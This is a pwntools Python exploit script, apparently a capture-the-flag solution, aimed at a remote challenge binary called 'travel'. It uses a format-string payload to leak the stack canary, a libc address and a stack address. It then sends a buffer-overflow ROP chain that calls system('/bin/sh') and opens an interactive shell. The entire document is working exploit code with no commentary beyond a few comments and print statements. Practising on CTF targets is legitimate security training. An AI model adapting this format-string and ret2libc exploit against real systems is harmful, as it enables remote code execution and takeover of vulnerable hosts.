from pwn import *
from struct import pack

context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+2900+0','-e']

host,port = "01.linux.challenges.ctf.thefewchosen.com", 51717

libc = ELF("./libc.so.6")

payload_leak_cookie = "%33$p"
payload_leak_libc = "%3$p"
payload_leak_stack = "%p"

LIBC_DATA_CODE_DELTA = 0x5c000
STACK_LEAK_DELTA = 0x2130
LIBC_OFFSET =  0xeca37 

BIN_SH_OFFSET = 0x1b698

PADDING = 216 
PADDING_WITHOUT_SSP = PADDING - 16

POP_RDI_DELTA =  0x2697b
io = remote(host,port)
#io = process("./travel", env={ "LD_PRELOAD" : "./libc.so.6" })
#io = gdb.debug(["./travel"], gdbscript='''set disable-randomization off''', env={ "LD_PRELOAD" : "./libc.so.6" })

#Leak some stack address, cookie and libc address
io.recvuntil(b" Where do you want to go?")
io.sendline(bytes(payload_leak_cookie + payload_leak_libc + payload_leak_stack, "utf-8"))
io.recvuntil(b"hmm... ")
leak = io.recv("4096").split(b" is an")[0].split(b"0x")[1:]
leak_cookie, leak_libc, leak_stack = leak

leak_cookie = int(leak_cookie, 16)
leak_libc = int(leak_libc, 16)
leak_stack = int(leak_stack, 16)

print(f"[i] leaks -> cookie: {hex(leak_cookie)}, libc: {hex(leak_libc)}, stack: {hex(leak_stack)}")

libc_base_address = leak_libc - LIBC_OFFSET
libc_data_section_base_address = libc_base_address + LIBC_DATA_CODE_DELTA
payload_location = leak_stack + STACK_LEAK_DELTA
system_addr = leak_libc - 0xc3cd7
pop_rdi = system_addr - POP_RDI_DELTA
ret = system_addr - 0x2708a 
binsh_addr = libc_data_section_base_address + BIN_SH_OFFSET +  0x139000

print(f"[i] libc data section is mapped at {hex(libc_data_section_base_address)}")
print(f"[i] libc code section is mmapped at {hex(libc_base_address)}")
print(f"[i] payload will be located at {hex(payload_location)}")
print(f"[i] @system is at {hex(system_addr)}")
print(f"[i] /bin/sh is at {hex(binsh_addr)}")
print(f"[i] pop rdi is at {hex(pop_rdi)}")
print(f"[i] ret is at {hex(ret)}")

#Now exploit by triggering buffer overflow

payload = b"A" * PADDING_WITHOUT_SSP + pack("<Q", leak_cookie) + b"JUNK" * 2
payload += pack("<Q",pop_rdi)
payload += pack("<Q", binsh_addr)
payload += pack("<Q", ret)
payload += pack("<Q",system_addr)

io.sendline(payload)
io.recv()
io.interactive()